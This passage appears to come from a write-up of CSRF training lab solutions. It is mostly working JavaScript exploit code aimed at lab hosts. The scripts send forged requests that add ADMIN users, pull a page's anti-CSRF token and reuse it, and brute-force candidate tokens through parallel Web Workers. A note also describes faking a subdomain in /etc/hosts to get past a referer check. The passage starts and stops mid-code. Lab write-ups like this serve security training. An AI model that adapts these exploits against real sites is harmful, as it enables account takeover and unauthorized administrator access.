               <span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">:</span> <span class="nx">tokens</span>
            <span class="p">});</span>
         <span class="p">}</span>

         <span class="kd">var</span> <span class="nx">bruterPath</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">csrf.labs.bruter.js</span><span class="dl">"</span><span class="p">;</span>

         <span class="kd">var</span> <span class="nx">ww1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
         <span class="nx">ww1</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww1&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
         <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

         <span class="kd">var</span> <span class="nx">ww2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
         <span class="nx">ww2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww2&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
         <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

         <span class="kd">var</span> <span class="nx">ww3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
         <span class="nx">ww3</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww3&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
         <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

         <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
         <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span>

         <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww1</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">333</span><span class="p">));</span>
         <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww2</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">333</span><span class="p">,</span> <span class="mi">666</span><span class="p">));</span>
         <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww3</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">666</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
      <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
      <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">counter.gif</span><span class="dl">"</span> <span class="o">/&gt;</span>
      <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>

<h2 id="lab-csrf">LAB CSRF</h2>

<h3 id="warm-up-csrf-level-1">Warm-up: CSRF level 1</h3>

<p>warm-up 
add the user did with BURP</p>

<h3 id="easy-csrf-level-2">Easy: CSRF level 2</h3>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://2.csrf.labs/add_user.php</span><span class="dl">"</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=talent&amp;surname=joao&amp;email=talent%40hacker.site&amp;role=ADMIN&amp;submit=</span><span class="dl">"</span>
<span class="kd">var</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">csrf</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">csrf</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">csrf</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="easy-csrf-level-3">Easy: CSRF level 3</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">test2</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nf">addUser</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://3.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">param</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=Malice&amp;surname=Smith&amp;email=malice%40hacker.site&amp;role=ADMIN&amp;submit=&amp;CSRFToken=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">;</span> 
    <span class="kd">var</span> <span class="nx">CSRF</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">CSRF</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
    <span class="nx">CSRF</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">CSRF</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">CSRF</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">param</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// Extract the token</span>
<span class="kd">var</span> <span class="nx">XHR</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">XHR</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> 
    <span class="k">if </span><span class="p">(</span><span class="nx">XHR</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">htmlSource</span> <span class="o">=</span> <span class="nx">XHR</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span> <span class="c1">// the source of users.php</span>
        <span class="c1">// Extract the token </span>
        <span class="kd">var</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DOMParser</span><span class="p">().</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">htmlSource</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">CSRFToken</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
        <span class="nf">addUser</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">XHR</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://3.csrf.labs/users.php</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">XHR</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
</code></pre></div></div>

<h3 id="medium-csrf-level-4">Medium: CSRF level 4</h3>

<blockquote>
  <p>I had to change the localhost in /etc/hosts value to a subdomain of the target
such as: hacker.site.4.csrf.labs
So the referer was not blocked</p>
</blockquote>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Anti</span><span class="o">-</span><span class="nx">CSRF</span> <span class="nx">Tokens</span> <span class="nx">to</span> <span class="nx">test</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tokens</span><span class="dl">"</span> <span class="nx">rows</span><span class="o">=</span><span class="dl">"</span><span class="s2">12</span><span class="dl">"</span> <span class="nx">cols</span><span class="o">=</span><span class="dl">"</span><span class="s2">60</span><span class="dl">"</span><span class="o">&gt;</span>
         <span class="mi">1679091</span><span class="nx">c5a880faf6fb5e6087eb1b2dc</span>
         <span class="mi">45</span><span class="nx">c48cce2e2d7fbdea1afc51c7c6ad26</span>
         <span class="mi">8</span><span class="nx">f14e45fceea167a5a36dedd4bea2543</span>
         <span class="nx">a87ff679a2f3e71d9181a67b7542122c</span>
         <span class="nx">c4ca4238a0b923820dcc509a6f75849b</span>
         <span class="nx">c81e728d9d4c2f636f067f89cc14862c</span>
         <span class="nx">c9f0f895fb98ab9159f51fd0297e236d</span>
         <span class="nx">cfcd208495d565ef66e7dff9f98764da</span>
         <span class="nx">d3d9446802a44259755d38e6d163e820</span>
         <span class="nx">e4da3b7fbbce2345d7772b0674a318d5</span>
         <span class="nx">eccbc87e4b5ce2fe28308fd9f2a7baf3</span>
      <span class="o">&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
         <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
               <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
               <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
            <span class="p">}</span>
         <span class="p">}</span>

         <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
            <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://4.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>
            <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>
            <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
               <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Johnny</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">praq</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">john@hacker.site</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
               <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span><span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
            <span class="p">};</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>

            <span class="c1">// Send the proper header information along with the request</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
               <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="c1">// We don't care about responses</span>
                  <span class="c1">// console.warn("Aborted " + token + " with status " + http.readyState);</span>
                  <span class="nx">http</span><span class="p">.</span><span class="nf">abort</span><span class="p">();</span>
               <span class="p">}</span>
            <span class="p">};</span>

            <span class="c1">// Serialize the data without using JQuery</span>
            <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
               <span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span>
               <span class="k">return</span> <span class="nx">a</span>
            <span class="p">},</span> <span class="p">[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
         <span class="p">}</span>

         <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
         <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span> <span class="c1">// Remove empty lines</span>

         <span class="c1">// Brute Loop</span>
         <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>
      <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div>

<h3 id="hard-csrf-level-5">Hard: CSRF level 5</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Anti</span><span class="o">-</span><span class="nx">CSRF</span> <span class="nx">Tokens</span> <span class="nx">to</span> <span class="nx">test</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tokens</span><span class="dl">"</span> <span class="nx">rows</span><span class="o">=</span><span class="dl">"</span><span class="s2">12</span><span class="dl">"</span> <span class="nx">cols</span><span class="o">=</span><span class="dl">"</span><span class="s2">60</span><span class="dl">"</span><span class="o">&gt;</span>
         <span class="mi">00411460</span><span class="nx">f7c92d2124a67ea0f4cb5f85</span>
         <span class="err">#</span> <span class="nx">add</span> <span class="nx">the</span> <span class="nx">tokens</span>
      <span class="o">&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Workers</span> <span class="nx">results</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">span</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/span</span><span class="err">&gt;
</span>
      <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
         <span class="kd">function</span> <span class="nf">startBlock</span><span class="p">(</span><span class="nx">worker</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">worker</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">({</span>
               <span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">:</span> <span class="nx">tokens</span>
            <span class="p">});</span>
         <span class="p">}</span>

         <span class="kd">var</span> <span class="nx">bruterPath</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">csrf.labs.bruter.js</span><span class="dl">"</span><span class="p">;</span>

         <span class="kd">var</span> <span class="nx">ww1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
         <span class="nx">ww1</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww1&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
         <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

         <span class="kd">var</span> <span class="nx">ww2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
         <span class="nx">ww2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww2&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
         <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

         <span class="kd">var</span> <span class="nx">ww3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Worker</span><span class="p">(</span><span class="nx">bruterPath</span><span class="p">);</span>
         <span class="nx">ww3</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">workers</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;b&gt;ww3&lt;/b&gt; says: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span><span class="p">;</span>
         <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

         <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
         <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span>

         <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww1</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">333</span><span class="p">));</span>
         <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww2</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">333</span><span class="p">,</span> <span class="mi">666</span><span class="p">));</span>
         <span class="nf">startBlock</span><span class="p">(</span><span class="nx">ww3</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">666</span><span class="p">,</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
      <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
      <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">counter.gif</span><span class="dl">"</span> <span class="o">/&gt;</span>
      <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div>

<h3 id="js-workers">JS workers</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">tokens</span><span class="p">;</span>

   <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
         <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
      <span class="p">}</span>
      <span class="nc">Terminator</span><span class="p">();</span>
   <span class="p">}</span>

   <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
      <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://5.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>

      <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>

      <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
         <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">luffy</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">joyboy</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">luffy@hacker.site</span><span class="dl">"</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
